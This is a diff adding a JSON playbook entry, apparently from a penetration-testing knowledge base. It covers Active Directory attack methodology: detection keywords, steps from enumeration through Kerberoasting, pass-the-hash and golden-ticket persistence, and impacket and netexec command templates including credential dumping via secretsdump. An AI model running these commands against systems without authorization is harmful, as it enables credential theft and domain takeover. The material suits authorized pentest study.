@@ -1,0 +1,48 @@
+{
+  "id": "active-directory-attack",
+  "title": "内网/AD 渗透方法论",
+  "vuln_pattern": "ad-lateral",
+  "fingerprint": [
+    "active directory",
+    "domain",
+    "kerberos",
+    "smb",
+    "ldap",
+    "445",
+    "88",
+    "ntlm",
+    "dc",
+    "横向",
+    "横向移动",
+    "内网",
+    "票据",
+    "活动目录",
+    "域控",
+    "域渗透",
+    "域",
+    "渗透"
+  ],
+  "exploit_steps": [
+    "枚举:netexec/enum4linux-ng、bloodhound 收集",
+    "AS-REP roasting / Kerberoasting 取票破解",
+    "凭据喷洒;PtH/PtT 横向(impacket)",
+    "dcsync/golden ticket 持久化"
+  ],
+  "key_payloads": [
+    "nxc smb T -u u -p p --shares",
+    "impacket-GetNPUsers dom/ -usersfile users -no-pass",
+    "impacket-secretsdump dom/u:p@T"
+  ],
+  "category": "pentest",
+  "cve": [],
+  "tags": [
+    "ad",
+    "lateral-movement",
+    "internal"
+  ],
+  "source": "seed: pentest methodology",
+  "created_ts": 0.0,
+  "preconditions": [],
+  "verify_oracle": "",
+  "pitfalls": []
+}
